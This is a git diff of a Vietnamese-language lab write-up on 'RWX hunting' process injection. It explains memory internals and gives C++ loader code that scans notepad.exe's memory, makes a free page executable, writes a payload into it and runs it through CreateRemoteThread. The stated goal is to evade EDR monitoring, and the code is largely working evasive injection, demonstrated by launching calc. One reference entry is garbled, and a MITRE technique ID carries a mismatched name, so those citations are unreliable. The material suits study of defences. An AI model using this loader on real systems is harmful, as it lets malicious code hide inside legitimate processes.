@@ -3,42 +3,47 @@
 
 # 📝 [PE 13] RWX Hunting and Injection (Adaptive Context Restoration V2)
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**RWX Hunting and Injection** là giải thuật né tránh phòng thủ động (Dynamic Evasion) mang đậm triết lý ký sinh.
+**RWX Hunting and Injection (Kỹ nghệ săn lùng và ký sinh không gian ảo)** đại diện cho một giải thuật can thiệp bộ nhớ nâng cao thuộc phân hệ **Né tránh phòng thủ động dựa trên cấu trúc RAM có sẵn (Memory Anti-Forensics / Code Parasitism)**.
 
-Hành vi sử dụng hàm `VirtualAllocEx` để tạo mới một trang bộ nhớ ảo luôn nằm trong tầm ngắm trinh sát nghiêm ngặt của các bộ quét hành vi động EDR. Lab PE 13 hóa giải bài toán này bằng cách **không xin cấp phát thêm bất kỳ phân vùng thực thi mới nào**, mà sử dụng lệnh `VirtualQueryEx` để quét toàn bộ bản đồ bộ nhớ ảo của tiến trình mục tiêu (ví dụ: `notepad.exe`) nhằm săn lùng một hốc trống có sẵn.
+Hành vi sử dụng hàm API Subsystem `VirtualAllocEx` để khởi tạo một trang bộ nhớ ảo mới là một trong những chỉ dấu hành vi (Telemetry Indicators) nhạy cảm nhất, luôn bị đặt dưới sự giám sát nghiêm ngặt của các bộ lọc nhân Kernel (Kêu gọi qua hàm Callbacks của `ObRegisterCallbacks` hoặc các bộ lọc Mini-filter).
 
-Đặc biệt, phiên bản nâng cấp V2 áp dụng giải thuật **Săn phân vùng Private rảnh (PAGE_READWRITE)** kết hợp cơ chế gài hàm đóng luồng an toàn bằng địa chỉ tuyệt đối để hóa giải lỗi sập Stack Frame, bảo đảm tiến trình cha sống sót và hoạt động mượt mà song song với Payload.
+Dự án PE 13 hóa giải bài toán sinh tử này bằng triệt lý **Ký sinh không gian có sẵn (Zero Allocation Taxonomy)**. Loader hoàn toàn không xin cấp phát thêm bất kỳ phân vùng bộ nhớ thô sơ nào từ hệ điều hành, mà lạm dụng hàm API `VirtualQueryEx` để quét và bóc tách toàn bộ bản đồ bộ nhớ ảo (Virtual Memory Topology) của tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`) nhằm săn lùng các hốc trống (Code Caves/Slack Memory) sẵn có.
+
+Đặc biệt, phiên bản nâng cấp V2 áp dụng giải thuật **Săn phân vùng Private rảnh (PAGE_READWRITE)** kết hợp cơ chế hoành trả/gài hàm giải thoát luồng an toàn bằng địa chỉ tuyệt đối để hóa giải lỗi sập tháp ngăn xếp (Stack Frame Corruption), bảo đảm tiến trình cha (Host Process) sống sót và hoạt động mượt mà song song với Payload.
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Vô hiệu hóa bộ lọc hành vi quét lệnh gọi tạo trang nhớ `VirtualAllocEx` của giải pháp an ninh.
-* Làm chủ giải thuật duyệt cấu trúc trang nhớ hệ thống qua hàm Native `VirtualQueryEx`.
-* Khắc phục lỗi sập RAM tiến trình mục tiêu thông qua cơ chế giải thoát luồng tuyệt đối `ExitThread`.
+* **Triệt tiêu chỉ dấu Alloc độc hại**: Vô hiệu hóa các bộ lọc hành vi quét lệnh gọi tạo trang nhớ `VirtualAllocEx` của giải pháp an ninh thông qua chiến thuật tái sử dụng ô nhớ cũ.
+* **Làm chủ giải thuật Virtual Memory Walk**: Duyệt và phân tích cấu trúc cấu hình trang nhớ hệ thống qua bản đồ cấu trúc `MEMORY_BASIC_INFORMATION` (MBI).
+* **Bảo toàn ngữ cảnh Host Process**: Hóa giải lỗi sập RAM ứng dụng vỏ bọc sau khi thực thi mã máy ký sinh bằng giải thuật cô lập tháp luồng.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Hệ điều hành Windows quản lý không gian ảo của tiến trình thông qua các cấu trúc phân vùng bộ nhớ được mô tả bởi bảng `MEMORY_BASIC_INFORMATION` (MBI).
+Hệ điều hành Windows quản lý không gian địa chỉ ảo ảo hóa của từng tiến trình thông qua các cấu trúc phân vùng bộ nhớ (Memory Regions). Thuộc tính của từng phân vùng này được mô tả chi tiết bởi bản ghi cấu trúc **`MEMORY_BASIC_INFORMATION`** sống trong RAM.
 
-Quy trình toán học giải phẫu bản đồ RAM và ký sinh mã máy của Lab PE 13 diễn ra qua các bước ngầm sau tại tầng Kernel:
-
-```
-[VirtualQueryEx: Quét cấu trúc trang] ──> [Săn hốc Private RW rảnh] ──> [VirtualProtectEx: Mở quyền] ──> [WriteProcessMemory: Ký sinh] ──> [ExitThread: Đóng luồng mượt]
+Quy trình toán học giải phẫu bản đồ RAM và điều phối dòng chảy CPU của Lab PE 13 diễn ra qua 4 giai đoạn ngầm:
 
 ```
+[VirtualQueryEx: Quét tịnh tiến bản đồ bộ nhớ ảo]
+       └──> [Săn hốc Private rảnh mang quyền PAGE_READWRITE]
+                 └──> [VirtualProtectEx: Lập cờ sang quyền RX/RWX kịch khung]
+                           └──> [WriteProcessMemory -> Kích nổ -> ExitThread đóng luồng an toàn]
 
-1. **Trinh sát cấu trúc trang nhớ (`VirtualQueryEx`)**: Loader tịnh tiến con trỏ địa chỉ ảo liên tục để bốc tách thông số trạng thái của từng phân vùng. Trình duyệt tìm kiếm sẽ bỏ qua các vùng nhớ hệ thống quá thấp và săn tìm các phân vùng mang trạng thái `MEM_COMMIT`, loại `MEM_PRIVATE` và cờ bảo vệ `PAGE_READWRITE` (vùng Heap/Stack rảnh đang chứa toàn byte `0x00`). Việc chọn vùng rảnh này giúp ta ghi đè mã máy lên mà không phá hỏng dữ liệu đang chạy của đối phương.
-2. **Lật cờ thích ứng (`VirtualProtectEx`)**: Do phân vùng săn được ban đầu chỉ có quyền ghi dữ liệu (`RW`), Loader gọi hàm lật cờ bảo vệ sang **`PAGE_EXECUTE_READWRITE` (RWX)** để chuẩn bị kích nổ CPU.
-3. **Cô lập và bảo toàn tháp luồng (`ExitThread`)**: Nếu Payload kết thúc bằng lệnh `return`, CPU tiến trình đích sẽ lấy một địa chỉ trả về rác từ Stack Frame bị vá, kích nổ ngoại lệ `Access Violation (0xC0000005)` làm sập Notepad ngay lập tức. Để hóa giải, Loader truyền địa chỉ RAM tuyệt đối của hàm **`ExitThread`** sang. Khi Payload chạy xong chức năng, nó gọi thẳng đến `ExitThread` để tự giải thoát luồng ký sinh một cách êm đẹp.
+```
+
+1. **Trinh sát và bóc tách bản đồ trang nhớ (`VirtualQueryEx`)**: Loader tịnh tiến con trỏ địa chỉ ảo liên tục để truy vấn thuộc tính của từng phân vùng bộ nhớ. Giải thuật chủ động bỏ qua các phân vùng hệ thống quá thấp hoặc các trang nhớ thuộc loại `MEM_IMAGE` (để tránh làm hỏng cấu trúc mã máy gốc của các file DLL hệ thống) và tập trung săn tìm các phân vùng mang trạng thái `MEM_COMMIT`, loại **`MEM_PRIVATE`** (như phân vùng Heap ảo rảnh) đang chứa toàn byte rỗng `0x00`. Việc chọn vùng rảnh này giúp ta ghi đè mã máy lên mà không phá hỏng dữ liệu đang vận hành của đối phương.
+2. **Lật cờ thuộc tính thích ứng (`VirtualProtectEx`)**: Do phân vùng săn được ban đầu chỉ mang quyền ghi dữ liệu thông thường (**`PAGE_READWRITE` - RW**), Loader thực hiện triệu hồi `VirtualProtectEx` để lật cờ bảo vệ của phân vùng này sang thuộc tính **`PAGE_EXECUTE_READWRITE` (RWX)** để tạm thời mở khóa đặc quyền thực thi cho CPU.
+3. **Bài toán cô lập tháp luồng (`ExitThread` Solution)**: Đây là điểm đột phá của phiên bản V2. Nếu Payload kết thúc bằng lệnh `return` truyền thống, con trỏ lệnh của CPU tiến trình đích sẽ lấy một địa chỉ trả về rác (Garbage Return Address) từ tháp ngăn xếp bị vá, kích nổ ngoại lệ bất hợp lệ **`Access Violation (0xC0000005)`** làm sập (Crash) tiến trình Notepad ngay lập tức. Để hóa giải, Loader truyền địa chỉ RAM tuyệt đối của hàm **`ExitThread`** sang bảng dữ liệu. Khi Payload chạy xong chức năng chính, nó phát lệnh gọi thẳng vào `ExitThread` để Kernel tự động giải thoát luồng ký sinh một cách phẳng sạch mà không ảnh hưởng đến sinh mạng của tiến trình mẹ.
 
 ---
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán thông số trang bộ nhớ thực tế để đạt độ ẩn mình kịch trần.
+Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa tính toán thông số trang bộ nhớ thực tế nhằm tối ưu hóa tính phòng thủ cấu trúc kịch trần bảo mật.
 
 ```cpp
 #include <windows.h>
@@ -47,27 +52,27 @@ Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – 
 #include <string>
 #include <vector>
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
+// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 typedef VOID(WINAPI* fnExitThread)(DWORD dwExitCode);
 
 typedef struct _THREAD_DATA {
     fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    fnExitThread pExitThread; // BẢO VỆ: Địa chỉ tuyệt đối của ExitThread để đóng luồng êm đẹp
+    fnExitThread pExitThread; // BẢO VỆ NGỮ CẢNH: Địa chỉ tuyệt đối của ExitThread để đóng luồng an toàn
     char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
 } THREAD_DATA, * PTHREAD_DATA;
 
-// 2. Hàm chức năng độc lập vị trí sẽ được ký sinh vào RAM đối phương
+// Hàm chức năng độc lập vị trí (PIC) sẽ được ký sinh vào RAM đối phương
 DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
-        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
+        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối dựa vào RIP
         pData->pWinExec(pData->szCommand, SW_HIDE);
     }
     
-    // GIẢI PHÁP ĐỘT PHÁ V2: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của tiến trình cha
+    // GIẢI PHÁP ĐỘT PHÁ V2: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của tiến trình mẹ
     if (pData && pData->pExitThread) {
-        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ
+        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ từ tầng nhân
     }
 
     while (TRUE) {
@@ -76,11 +81,9 @@ DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
     return 0;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
 
@@ -92,11 +95,10 @@ DWORD GetProcessIDByName(const std::wstring& processName) {
             }
         } while (Process32NextW(hSnapshot, &pe32));
     }
-    CloseHandle(hSnapshot);
-    return processID;
+    CloseHandle(hSnapshot);   return processID;
 }
 
-// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn
+// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn (Virtual Memory Walker)
 PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& needsProtectToggle) {
     MEMORY_BASIC_INFORMATION mbi;
     LPVOID address = 0;
@@ -104,7 +106,7 @@ PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& ne
 
     needsProtectToggle = FALSE;
 
-    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên x64
+    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên kiến trúc x64
     while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {
 
         // CHIẾN THUẬT LÝ TƯỞNG: Săn phân vùng COMMIT có sẵn thuộc tính PAGE_EXECUTE_READWRITE (RWX)
@@ -144,7 +146,7 @@ int main() {
     DWORD pid = GetProcessIDByName(targetProcess);
 
     if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc nhen." << std::endl;
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc." << std::endl;
         return EXIT_FAILURE;
     }
     std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
@@ -164,7 +166,7 @@ int main() {
         return EXIT_FAILURE;
     }
 
-    // Bước 2: Cấp phát riêng ô nhỏ chứa tham số dữ liệu tuyệt đối từ xa
+    // Bước 2: Cấp phát riêng ô nhỏ chứa tham số dữ liệu tuyệt đối từ xa nhằm bảo vệ Code Cave
     PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteData) {
         CloseHandle(hProcess);
@@ -197,7 +199,7 @@ int main() {
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxTargetAddress, pRemoteData, 0, NULL);
 
     if (hThread != NULL) {
-        WaitForSingleObject(hThread, 1000); // Chờ 1 giây đồng bộ ngắn để WinExec kịp nổ tung
+        WaitForSingleObject(hThread, 1000); // Chờ đồng bộ ngắn để WinExec kịp nổ tung
         std::cout << "[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!" << std::endl;
         CloseHandle(hThread);
     }
@@ -221,19 +223,25 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)
 
-### ⚙️ Thiết lập trên Microsoft Visual Studio:
+Để bảo đảm file thực thi `.exe` vận hành mượt mà, độc lập, loại bỏ hoàn toàn các chỉ dấu cảnh báo tĩnh phụ thuộc vào thư viện liên kết động bọc ngoài:
 
-1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
-2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh thư viện hệ thống chạy mượt mà trên môi trường máy ảo VM sạch.
-3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản file `.exe` độc lập hoàn hảo.
+### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:
+
+1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
+2. Di chuyển đến phân hệ cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, lật cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.
+
+> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
+> 
+
+3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ phẳng sạch.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:
+Bật sẵn ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó thực thi file thực hành thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng ma trận săn lùng bộ nhớ rảnh:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE13_RWX_Hunting_Injection.exe
@@ -252,7 +260,19 @@ PS C:\Workspace\x64\Release> .\PE13_RWX_Hunting_Injection.exe
 
 ```
 
-*🎯 Hệ quả RAM:* Dò trúng hốc trống bộ nhớ rảnh đang sống của đối phương, gài Payload cấu trúc tuyệt đối vào ký sinh, mở Máy tính `calc.exe` bật bung hiên ngang tại chỗ mà tiến trình Notepad hoàn toàn bình an vô sự!
+> **Vị trí đặt ảnh minh chứng thực nghiệm Code Cave Injection:**
+> 
+
+### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Analysis):
+
+* Giải thuật thực thi hoàn tất mỹ mãn. Loader dò tìm và trích xuất trúng tọa độ hốc trống rảnh đang sống của đối phương tại địa chỉ **`0x000000839E3C9000`** thuộc vùng nhớ `MEM_PRIVATE`.
+* Gài Payload cấu trúc tuyệt đối vào ký sinh, ứng dụng Máy tính `calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung. Nhờ cơ chế triệu hồi `ExitThread` gián tiếp từ xa, luồng ký sinh tự giải phóng êm đẹp mà không gây ra bất kỳ xung đột tháp ngăn xếp nào, tiến trình Notepad hoàn toàn bình an vô sự và hoạt động song song mượt mà!
 
 ---
 
+## 📚 6. Tài Liệu Tham Khảo (Technical References)
+
+* **Microsoft Learn Documentation**: *VirtualQueryEx function (memoryapi.h)* - [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
+* **Windows Memory Management**: *Virtual Address Spaces and Memory Protection Constants* - Microsoft Architecture Guide.
+* **Sc消費 (Scythe Research)**: *Code Caves and Stealthy Code Injection Techniques without Allocations*.
+* **MITRE ATT&CK Framework**: *Process Injection: Control Flow Redirection (T1055.011)* - Analysis on Memory Scanning Bypasses.
